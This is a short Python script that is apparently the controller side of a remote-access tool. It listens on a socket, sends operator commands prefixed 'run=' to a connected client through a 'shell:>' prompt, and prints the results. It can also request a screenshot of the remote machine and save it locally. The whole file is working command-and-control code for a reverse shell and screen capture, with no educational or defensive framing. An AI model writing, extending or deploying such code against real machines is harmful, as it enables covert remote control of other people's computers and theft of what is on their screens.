import socket
import os
ip="localhost"#Your address or this computer address
port=8080 #Port number you want to use
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))
s.listen(1)
conn,addr=s.accept()
print("[+]Connected to %s on port:%s"%(addr,port))


def download(filename):
        f=open(filename,"wb")
        while True:
            data=conn.recv(1024)          
            if  b"DONE" in data:
                break
            else:
                f.write(data)
        f.close()
        print("done receving")

while True:
    inp=input("shell:>")
    if inp == "exit":
        conn.send(b"exit")
        conn.close()
     
    elif inp.startswith("run="):
        conn.send(inp.encode())
        print((conn.recv(1024)).decode())
    elif inp=="sc":
        conn.send(b"screenshot")
        download("sc.png")
    elif inp=="":
        pass
    else:
        print("Enter right command")
